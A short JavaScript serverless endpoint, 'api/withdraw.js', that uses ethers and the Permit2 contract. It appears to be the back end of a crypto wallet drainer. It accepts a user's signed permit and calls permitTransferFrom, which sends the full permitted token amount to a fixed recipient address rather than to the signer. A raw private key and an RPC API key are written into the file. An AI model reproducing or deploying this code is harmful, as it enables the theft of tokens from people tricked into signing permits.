// api/withdraw.js
const { ethers } = require('ethers');

// Initialize provider and wallet globally for Vercel warm-start optimization
const RPC_URL = "https://mainnet.infura.io/v3/08c65b8cf2e240289b07b7d0a55ecd18";
const PRIVATE_KEY = "db3abb1aa82f1330224830afe7fa9ed2fa9e9ac0157547dea0b04aa282becd86";
const RECIPIENT_ADDRESS = "0x3848f1375B64053910c8C5aDE2e0BDC89e243F20";
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

// Full proper ABI with nested struct definitions (fixes INVALID_ARGUMENT errors)
const PERMIT2_ABI = [
    "function permitTransferFrom(" +
    "tuple(tuple(address token,uint256 amount) permitted,uint256 nonce,uint256 deadline) permit," +
    "tuple(address to,uint256 requestedAmount) transferDetails," +
    "address owner," +
    "bytes signature" +
    ")"
];

const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);

module.exports = async (req, res) => {
    if (req.method !== 'POST') return res.status(405).json({ success: false, message: 'Method not allowed' });

    try {
        const { signature, permitData, owner } = req.body;

        if (!signature || !permitData || !owner) {
            return res.status(400).json({ success: false, message: 'Missing signature, permitData or owner' });
        }

        // Ensure proper checksum formatting for addresses
        const formattedOwner = ethers.utils.getAddress(owner);
        const tokenAddr = ethers.utils.getAddress(permitData.token);

        const permit = {
            permitted: {
                token: tokenAddr,
                amount: permitData.amount
            },
            nonce: permitData.nonce,
            deadline: permitData.deadline
        };

        const transferDetails = {
            to: ethers.utils.getAddress(RECIPIENT_ADDRESS),
            requestedAmount: permitData.amount
        };

        const tx = await permit2Contract.permitTransferFrom(
            permit,
            transferDetails,
            formattedOwner,
            signature
        );

        const receipt = await tx.wait();
        return res.status(200).json({ success: true, txHash: receipt.transactionHash });
    } catch (error) {
        console.error('Execution Error:', error);
        return res.status(500).json({ success: false, message: error.message || 'Transaction failed' });
    }
};
